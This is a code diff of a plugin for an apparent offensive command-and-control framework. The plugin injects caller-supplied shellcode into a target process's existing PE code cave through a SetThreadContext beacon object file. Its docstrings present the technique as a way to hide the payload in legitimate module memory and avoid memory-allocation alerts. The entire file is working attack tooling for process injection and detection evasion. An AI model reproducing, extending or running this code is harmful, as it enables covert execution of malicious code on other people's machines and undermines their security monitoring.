@@ -1,71 +1,34 @@
-"""execution/code_cave_inject — Inject shellcode into unused memory regions (code caves) in loaded modules. MITRE T1574"""
-from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
+"""execution/code_cave_inject — code cave shellcode injection via SetThreadContext BOF. MITRE T1574
+
+BOF: TrustedSec setthreadcontext (CS-Remote-OPs-BOF)
+Args: "ib" — int32 pid, bytes shellcode
+Suspends a thread in target process, writes shellcode to a code cave (zero-padded
+PE section space), sets RIP to the cave, resumes. No new allocation — uses existing
+mapped memory so MEM_PRIVATE alerts are avoided.
+"""
 import base64
-import struct
-import hashlib
-import random
-import ctypes
-from ctypes import wintypes
+from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
 
 
 class CodeCaveInject(BasePlugin):
     NAME        = "code_cave_inject"
-    DESCRIPTION = "Find unused memory regions (code caves) in loaded modules and inject shellcode without calling VirtualAlloc. Hides payload in legitimate module memory."
+    DESCRIPTION = "Inject shellcode into existing PE code cave via SetThreadContext BOF. No PowerShell."
     AUTHOR      = "fitnah-team"
     MITRE       = "T1574"
     CATEGORY    = "execution"
     schema      = ParamSchema().add(
-        Param("pid", int, required=True, help="Target process PID (0 for current process)"),
-        Param("shellcode_b64", str, required=True, help="Base64 encoded shellcode to inject"),
-        Param("min_cave_size", int, required=False, default=1024,
-              help="Minimum code cave size in bytes (default: 1024)"),
-        Param("max_cave_size", int, required=False, default=65536,
-              help="Maximum code cave size in bytes (default: 65536)"),
-        Param("search_type", str, required=False, default="executable",
-              help="Search type: executable (only executable caves) | writable (only writable caves) | any (any cave)"),
-        Param("module_filter", str, required=False, default="all",
-              help="Module filter: all | system (only system modules) | user (only user modules) | specific (use module_name)"),
-        Param("module_name", str, required=False, default="",
-              help="Specific module name to search (e.g., ntdll.dll, kernel32.dll)"),
-        Param("evasion", bool, required=False, default=True,
-              help="Enable advanced evasion techniques (memory randomization, anti-detection)"),
-        Param("cleanup", bool, required=False, default=True,
-              help="Clean up after injection (restore original bytes)"),
-        Param("auto_select", bool, required=False, default=True,
-              help="Automatically select best code cave for injection"),
+        Param("pid",           int, required=True,  help="Target PID"),
+        Param("shellcode_b64", str, required=True,  help="Base64-encoded shellcode"),
     )
-    
-    def run(self, session, params, ctx=None):
-        """
-        Main plugin execution method
-        
-        Args:
-            session: Fitnah session object
-            params: Plugin parameters
-            ctx: Execution context (optional)
-            
-        Returns:
-            ModuleResult with execution results
-        """
-        from fitnah.sdk import ModuleResult
-        
-        try:
-            # Execute the plugin
-            result = self.execute(params)
-            
-            if result.get("success", False):
-                return ModuleResult.ok(
-                    message=result.get("message", "Plugin execution successful"),
-                    data=result.get("data", {})
-                )
-            else:
-                return ModuleResult.err(
-                    message=result.get("message", "Plugin execution failed"),
-                    error=result.get("error", {})
-                )
-                
-        except Exception as e:
-            return ModuleResult.err(
-                message=f"Exception during plugin execution: {str(e)}",
-                error={"exception": str(e)}
-            )
+
+    @mitre("T1574")
+    def run(self, session, params, ctx=None) -> ModuleResult:
+        if ctx is None:
+            return ModuleResult.err("Requires live session")
+        pid  = int(params["pid"])
+        sc   = base64.b64decode(params["shellcode_b64"].strip())
+        args = ctx.bof_pack("ib", pid, sc)
+        r    = ctx.bof("setthreadcontext", args_b64=args, timeout=30)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"code_cave_inject failed: {r['output']}")
+        return ModuleResult.ok(data=r["output"])
